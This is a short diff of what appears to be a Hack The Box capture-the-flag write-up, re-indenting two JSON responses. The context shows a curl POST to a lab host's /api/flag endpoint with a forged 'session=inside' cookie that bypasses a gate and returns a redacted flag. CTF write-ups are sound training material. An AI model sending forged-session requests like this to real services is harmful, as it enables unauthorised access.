@@ -19,7 +19,7 @@ Looking at the scenario files, one thing immediately stood out:
     Connection: keep-alive
     set-cookie: session=inside.wb06PCcHAVpgc3x50X9YlAoDQHHjIO8%2BFRDPlS%2B%2FWF4; Max-Age=3600; Path=/; HttpOnly; SameSite=Lax
 
-{"ok":true,"insideGate":true}
+    {"ok":true,"insideGate":true}
 
 >curl -i -X POST http://154.57.164.77:30761/api/flag -H "Cookie: session=inside"
 
@@ -30,7 +30,7 @@ Looking at the scenario files, one thing immediately stood out:
     Content-Length: 82
     Connection: keep-alive
 
-{"ok":true,"flag":"HTB{...}"}
+    {"ok":true,"flag":"HTB{...}"}
 
 <details>
 <summary>Final Flag</summary>
